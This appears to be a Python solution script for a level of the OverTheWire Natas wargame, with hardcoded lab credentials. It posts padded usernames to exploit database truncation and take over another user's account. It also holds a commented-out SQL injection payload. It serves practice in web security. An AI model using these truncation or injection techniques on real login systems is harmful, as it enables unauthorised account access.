import requests

username = "natas27"
password = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)
# response = session.get(url, auth=(username, password))

# Check if user natas28 is in the database
# response = session.post(url, data={
#                         "username": "natas28", "password": "password"}, auth=(username, password))
# content = response.text
# print(content)

# Trying out SQL injection (does not work)
# response = session.post(url, data={
#                         "username": "natas28\" or 1=1;--", "password": "password"}, auth=(username, password))
# content = response.text
# print(content)

response = session.post(url, data={
                        "username": "natas28" + " " * 64 + "2", "password": "password"}, auth=(username, password))
content = response.text
print(content)

response = session.post(url, data={
                        "username": "natas28" + " " * 64 + "2", "password": "password2"}, auth=(username, password))
content = response.text
print(content)

response = session.post(url, data={
                        "username": "natas28", "password": "password"}, auth=(username, password))
content = response.text
print(content)
